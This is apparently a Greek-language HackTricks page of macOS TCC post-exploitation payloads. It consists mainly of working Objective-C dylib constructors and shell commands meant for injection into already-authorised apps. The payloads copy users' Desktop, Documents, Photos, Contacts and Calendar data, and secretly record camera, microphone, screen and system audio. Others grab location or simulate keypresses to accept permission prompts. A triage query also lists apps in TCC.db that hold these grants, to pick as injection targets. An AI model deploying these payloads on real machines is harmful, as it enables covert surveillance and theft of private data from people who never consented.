# macOS TCC Payloads

{{#include ../../../../banners/hacktricks-training.md}}

> [!TIP]
> Οι αποφάσεις του TCC συνδέονται με την **ταυτότητα της διεργασίας** που ζητά πρόσβαση στον πόρο. Κατά το post-exploitation, ο συνήθης στόχος είναι να γίνει **inject σε αυτά τα payloads σε μια ήδη εγκεκριμένη εφαρμογή** (ή να εκτελεστούν με άλλο τρόπο στο bundle / signature context της), αντί να εκτελεστεί ένας νέος helper που θα προκαλέσει το δικό του prompt.
>
> Για τα **Screen Recording**, **Input Monitoring** και το **synthetic input**, τα σύγχρονα macOS παρέχουν επίσης explicit preflight / request APIs, όπως τα `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` και `CGRequestPostEventAccess`.

> [!WARNING]
> Αυτό εξακολουθεί να αποτελεί μια πολύ ρεαλιστική attack path: πρόσφατη έρευνα permission-theft εναντίον Microsoft macOS apps έδειξε ότι το **weak library validation / plugin loading** μπορεί να επιτρέψει σε έναν attacker να επαναχρησιμοποιήσει τα ήδη εκχωρημένα TCC permissions της victim app για **camera**, **microphone** και άλλους πόρους, χωρίς δεύτερο prompt.<sup>[[1]](#references)</sup>

## Quick triage before using a payload

Η πρόσφατη έρευνα permission-theft συνεχίζει να επιβεβαιώνει την ίδια workflow: πρώτα εντοπίστε μια εφαρμογή που διαθέτει ήδη το TCC grant που θέλετε και, στη συνέχεια, επαληθεύστε ότι αποτελεί ρεαλιστικό injection target.<sup>[[1]](#references)</sup>
```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"

codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
egrep 'disable-library-validation|allow-dyld-environment-variables'
```
Αν ο στόχος φορτώνει επίσης plug-ins / frameworks που ελέγχονται από τον attacker, αυτά τα payloads γίνονται πολύ πιο ενδιαφέροντα. Για ευρύτερες ιδέες post-exploitation μετά την είσοδο σε μια ήδη εγκεκριμένη διεργασία, δείτε [αυτή τη σχετική σελίδα](macos-tcc-credential-and-data-theft.md).

### Desktop

- **Entitlement**: Κανένα
- **TCC**: kTCCServiceSystemPolicyDesktopFolder

{{#tabs}}
{{#tab name="ObjetiveC"}}
Αντιγράψτε το `$HOME/Desktop` στο `/tmp/desktop`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
NSString *tmpPhotosPath = @"/tmp/desktop";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Αντέγραψε το `$HOME/Desktop` στο `/tmp/desktop`.
```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```
{{#endtab}}
{{#endtabs}}

### Έγγραφα

- **Entitlement**: Κανένα
- **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Αντιγράψτε το `$HOME/Documents` στο `/tmp/documents`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
NSString *tmpPhotosPath = @"/tmp/documents";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Αντέγραψε το `$HOME/`Documents στο `/tmp/documents`.
```bash
cp -r "$HOME/Documents" "/tmp/documents"
```
{{#endtab}}
{{#endtabs}}

### Λήψεις

- **Entitlement**: None
- **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Αντέγραψε το `$HOME/Downloads` στο `/tmp/downloads`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
NSString *tmpPhotosPath = @"/tmp/downloads";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Αντιγράψτε το `$HOME/Downloads` στο `/tmp/downloads`.
```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```
{{#endtab}}
{{#endtabs}}

### Βιβλιοθήκη Photos

- **Entitlement**: `com.apple.security.personal-information.photos-library`
- **TCC**: `kTCCServicePhotos`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Αντιγράψτε το `$HOME/Pictures/Photos Library.photoslibrary` στο `/tmp/photos`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
NSString *tmpPhotosPath = @"/tmp/photos";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Αντέγραψε το `$HOME/Pictures/Photos Library.photoslibrary` στο `/tmp/photos`.
```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```
{{#endtab}}
{{#endtabs}}

### Επαφές

- **Entitlement**: `com.apple.security.personal-information.addressbook`
- **TCC**: `kTCCServiceAddressBook`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Αντιγράψτε το `$HOME/Library/Application Support/AddressBook` στο `/tmp/contacts`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
NSString *tmpPhotosPath = @"/tmp/contacts";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Αντέγραψε το `$HOME/Library/Application Support/AddressBook` στο `/tmp/contacts`.
```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```
{{#endtab}}
{{#endtabs}}

### Ημερολόγιο

- **Entitlement**: `com.apple.security.personal-information.calendars`
- **TCC**: `kTCCServiceCalendar`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Αντιγράψτε το `$HOME/Library/Calendars` στο `/tmp/calendars`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
NSString *tmpPhotosPath = @"/tmp/calendars";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Αντέγραψε το `$HOME/Library/Calendars` στο `/tmp/calendars`.
```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```
{{#endtab}}
{{#endtabs}}

### Κάμερα

- **Entitlement**: `com.apple.security.device.camera`
- **TCC**: `kTCCServiceCamera`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Καταγράψτε ένα βίντεο διάρκειας 3 δευτερολέπτων και αποθηκεύστε το στο **`/tmp/recording.mov`**<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}
- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
NSError *error;
self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
if (error) {
NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
return;
}
if ([self.captureSession canAddInput:self.videoDeviceInput]) {
[self.captureSession addInput:self.videoDeviceInput];
}
self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([self.captureSession canAddOutput:self.movieFileOutput]) {
[self.captureSession addOutput:self.movieFileOutput];
}
}
- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = @"/tmp/recording.mov";
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}
- (void)stopRecording {
[self.movieFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
[videoRecorder startRecording];
[NSThread sleepForTimeInterval:3.0];
[videoRecorder stopRecording];
[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Ελέγξτε αν το πρόγραμμα έχει πρόσβαση στην κάμερα.<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to camera granted.");
return YES;
} else {
NSLog(@"[-] Access to camera denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
[CameraAccessChecker hasCameraAccess];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Ενεργοποιήστε την προτροπή για την κάμερα, εάν η τρέχουσα διεργασία εξακολουθεί να είναι `NotDetermined`.<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void camprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Τραβήξτε μια φωτογραφία με την κάμερα
```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```
{{#endtab}}
{{#endtabs}}

### Μικρόφωνο

- **Entitlement**: **com.apple.security.device.audio-input**
- **TCC**: `kTCCServiceMicrophone`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Καταγραφή ήχου διάρκειας 5 δευτερολέπτων και αποθήκευσή του στο `/tmp/recording.m4a`<sup>[[6]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}

- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
NSError *error;
self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

if (error) {
NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
return;
}

if ([self.captureSession canAddInput:self.audioDeviceInput]) {
[self.captureSession addInput:self.audioDeviceInput];
}

self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

if ([self.captureSession canAddOutput:self.audioFileOutput]) {
[self.captureSession addOutput:self.audioFileOutput];
}
}

- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}

- (void)stopRecording {
[self.audioFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

freopen("/tmp/logs.txt", "a", stderr);
AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

[audioRecorder startRecording];
[NSThread sleepForTimeInterval:5.0];
[audioRecorder stopRecording];

[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Ελέγξτε αν η εφαρμογή έχει πρόσβαση στο μικρόφωνο.<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to microphone granted.");
return YES;
} else {
NSLog(@"[-] Access to microphone denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
[MicrophoneAccessChecker hasMicrophoneAccess];
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Ενεργοποιήστε το prompt πρόσβασης στο μικρόφωνο, εάν η τρέχουσα διεργασία εξακολουθεί να είναι `NotDetermined`.<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void micprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Καταγράψτε ήχο διάρκειας 5 δευτερολέπτων και αποθηκεύστε τον στο `/tmp/recording.wav`
```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```
{{#endtab}}
{{#endtabs}}

### Ήχος συστήματος (Core Audio process taps)

- **Entitlement**: Δεν υπάρχει dedicated entitlement για system-audio-capture για unsandboxed client (ισχύουν κανονικά οι περιορισμοί του sandbox)
- **Usage description**: `NSAudioCaptureUsageDescription`
- **TCC**: System Audio Recording (ανεξάρτητο από την άδεια πρόσβασης στο Microphone)

Στο **macOS 14.2+**, τα Core Audio process taps μπορούν να αντιγράφουν τον εξερχόμενο ήχο επιλεγμένων processes, μιας ομάδας processes ή του global mix, χωρίς εγκατάσταση virtual loopback driver. Η low-level αλυσίδα είναι `CATapDescription` -> `AudioHardwareCreateProcessTap` -> private aggregate device -> `AudioDeviceIOProc`. Η πρώτη προσπάθεια έναρξης recording μέσω ενός aggregate που περιέχει το tap κάνει το macOS να ζητήσει πρόσβαση στο System Audio Recording. Ένα bundle πρέπει να περιέχει το `NSAudioCaptureUsageDescription`, διαφορετικά η ροή consent δεν μπορεί να λειτουργήσει σωστά.<sup>[[7]](#references)</sup>

Για ένα γρήγορο payload, το [`catap`](https://github.com/sbetko/catap) περιλαμβάνει wrapper για το tap, το aggregate device, το IO callback, το WAV writer και τον κύκλο ζωής του cleanup:<sup>[[8]](#references)</sup>
```bash
python3 -m venv /tmp/catap-env
source /tmp/catap-env/bin/activate
pip install catap
catap list-apps
catap record Safari -d 10 -o /tmp/safari.wav
catap record --system -d 10 -o /tmp/system-mix.wav
```
> [!WARNING]
> Το TCC αποδίδει μια λήψη CLI στην **εφαρμογή τερματικού που τη φιλοξενεί**, όχι απλώς στη διεργασία Python. Χωρίς την παραχώρηση System Audio Recording, το γράφημα Core Audio μπορεί να ξεκινήσει και να παραδώσει buffers με το σωστό μέγεθος αλλά **γεμάτα μηδενικά**, κάτι που εύκολα εκλαμβάνεται ως επιτυχημένη λήψη ενός αθόρυβου στόχου. Παραχωρήστε την άδεια στον host, επανεκκινήστε τον και επαναλάβετε με μια γνωστά ακουστή πηγή· το `catap` αναφέρει επίσης όταν μια εγγραφή περιείχε μόνο σιωπή.<sup>[[8]](#references)</sup>

### Τοποθεσία

> [!TIP]
> Για να αποκτήσει μια εφαρμογή την τοποθεσία, οι **Υπηρεσίες τοποθεσίας** (από το Privacy & Security) **πρέπει να είναι ενεργοποιημένες·** διαφορετικά δεν θα μπορεί να έχει πρόσβαση σε αυτήν.

- **Entitlement**: `com.apple.security.personal-information.location`
- **TCC**: Παραχωρείται στο `/var/db/locationd/clients.plist`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Εγγράψτε την τοποθεσία στο `/tmp/logs.txt`
```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *location = [locations lastObject];
NSLog(@"Current location: %@", location);
exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
NSLog(@"Error getting location: %@", error);
exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSLog(@"Getting location");
CLLocationManager *locationManager = [[CLLocationManager alloc] init];
LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
locationManager.delegate = delegate;

[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
[locationManager startUpdatingLocation];

NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
while (true) {
[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}

NSLog(@"Location completed successfully.");
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="Shell"}}
Λάβε την τρέχουσα τοποθεσία από το shell.<sup>[[2]](#references)</sup>
```bash
# Fast option: use a dedicated CoreLocation CLI helper
brew install --cask corelocationcli
CoreLocationCLI --json

# Keep printing updates while the device moves
CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
```
> [!TIP]
> Αυτό εξακολουθεί να εξαρτάται από την ενεργοποίηση των **Location Services** και από τη λήψη έγκρισης TCC από το tool / terminal. Το `CoreLocationCLI` βασίζεται επίσης σε positioning μέσω Wi-Fi στα περισσότερα Mac, επομένως η απενεργοποίηση του Wi-Fi συχνά καταλήγει σε `kCLErrorDomain error 0`.

{{#endtab}}
{{#endtabs}}

### Screen Recording

- **Entitlement**: None
- **TCC**: `kTCCServiceScreenCapture`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Καταγραφή της κύριας οθόνης για 5s στο `/tmp/screen.mov`
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording error: %@", error);
} else {
NSLog(@"Recording finished successfully.");
}
exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
if ([captureSession canAddInput:screenInput]) {
[captureSession addInput:screenInput];
}

AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([captureSession canAddOutput:fileOutput]) {
[captureSession addOutput:fileOutput];
}

[captureSession startRunning];

MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

// Run the loop for 5 seconds to capture
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
[fileOutput stopRecording];
});

CFRunLoopRun();
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check / Prompt"}}
Ελέγχει αν η τρέχουσα διεργασία μπορεί να καταγράψει την οθόνη και ενεργοποιεί το TCC prompt, αν χρειάζεται.
```objectivec
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>

// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib

__attribute__((constructor))
static void screencheck(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
BOOL allowed = CGPreflightScreenCaptureAccess();
if (!allowed) {
allowed = CGRequestScreenCaptureAccess();
}
NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
fclose(stderr);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Καταγράψτε την κύρια οθόνη για 5 δευτ.
```bash
screencapture -V 5 /tmp/screen.mov
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Σε **macOS 12.3+**, το `ScreenCaptureKit` είναι συνήθως καλύτερο post-exploitation primitive από το `AVCaptureScreenInput`: υποστηρίζει streaming υψηλής απόδοσης, λήψεις μεμονωμένων καρέ με το `SCScreenshotManager` και streaming **system audio**. Οι πρόσφατες ενημερώσεις του `ScreenCaptureKit` πρόσθεσαν επίσης τα `captureMicrophone` / `microphoneCaptureDeviceID` στο `SCStreamConfiguration`, καθώς και το `SCRecordingOutput` για εγγραφή απευθείας σε αρχείο, έτσι ώστε ένας hijacked client καταγραφής οθόνης να μπορεί να αποθηκεύει απευθείας την οθόνη + το system audio και να προσθέτει ήχο από το μικρόφωνο όταν η διεργασία διαθέτει επίσης το `kTCCServiceMicrophone`.<sup>[[4]](#references)</sup> Για περισσότερα primitives κατάχρησης της desktop session, δείτε [αυτή τη σχετική σελίδα](../macos-input-monitoring-screen-capture-accessibility.md).

### Accessibility

- **Entitlement**: Κανένα
- **TCC**: `kTCCServiceAccessibility`

Χρησιμοποιήστε το TCC privilege για να αποδεχτείτε τον έλεγχο του Finder πατώντας Enter και να παρακάμψετε το TCC με αυτόν τον τρόπο

{{#tabs}}
{{#tab name="Accept TCC"}}
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
CGEventPost(kCGHIDEventTap, keyDownEvent);
CGEventPost(kCGHIDEventTap, keyUpEvent);
if (keyDownEvent) CFRelease(keyDownEvent);
if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
NSLog(@"Starting AppleScript");
NSString *scriptSource = @"tell application \"Finder\"\n"
